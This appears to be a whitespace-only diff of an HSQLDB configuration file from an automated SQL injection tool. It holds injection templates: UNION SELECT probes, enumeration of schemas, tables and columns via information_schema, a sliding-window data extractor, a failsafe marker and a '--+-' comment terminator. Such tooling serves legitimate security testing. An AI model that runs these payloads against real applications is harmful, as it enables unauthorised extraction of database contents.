@@ -1,6 +1,6 @@
 vendor: HSQLDB
 
-resource: 
+resource:
  info: |
   select concat(
       concat_ws(
@@ -14,8 +14,8 @@ resource:
   FROM (
       VALUES(0)
   )
-  
- schema: 
+
+ schema:
   database: |
    select concat(
        group_concat(
@@ -28,7 +28,7 @@ resource:
            separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
-   ) r 
+   ) r
    from (
        select
            convert(schema_name, SQL_VARCHAR) r,
@@ -39,7 +39,7 @@ resource:
        group by r
        ${limit}
    ) x
-   
+
   table: |
    select concat(
        group_concat(
@@ -50,7 +50,7 @@ resource:
            separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
-   ) r 
+   ) r
    from (
        select TABLE_NAME r
        from information_schema.tables
@@ -58,7 +58,7 @@ resource:
        order by r
        ${limit}
    ) x
-   
+
   column: |
    select concat(
        group_concat(
@@ -71,7 +71,7 @@ resource:
            separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
-   ) r 
+   ) r
    from (
        select COLUMN_NAME n
        from information_schema.columns
@@ -80,8 +80,8 @@ resource:
        order by n
        ${limit}
    ) x
-   
-  row: 
+
+  row:
    query: |
     select concat(
         group_concat(
@@ -103,15 +103,15 @@ resource:
         group by r
         ${limit}
     ) x
-   fields: 
+   fields:
     field: trim(ifnull(convert(${field.value}, SQL_VARCHAR), ''))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
-   select 
-       '${lead}' 
+   select
+       '${lead}'
        || substr(
            r,
            ${window.char},
@@ -126,17 +126,17 @@ strategy:
   limit: limit ${limit.value}, 65536
   failsafe: |
    select
-       (1337${indice}7330%2b1) 
-       || '' r 
+       (1337${indice}7330%2b1)
+       || '' r
    FROM (VALUES(0))
   calibrator: repeat('${calibrator_sql}', 1024)
   limitBoundary: 0
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - HSQLDB
-    
- normal: 
+
+ normal:
   indices: union select ${result_range} from (${indice_unique}) b
   capacity: ('${lead}' || ${indice} || ${calibrator})
   orderBy: order by 1337
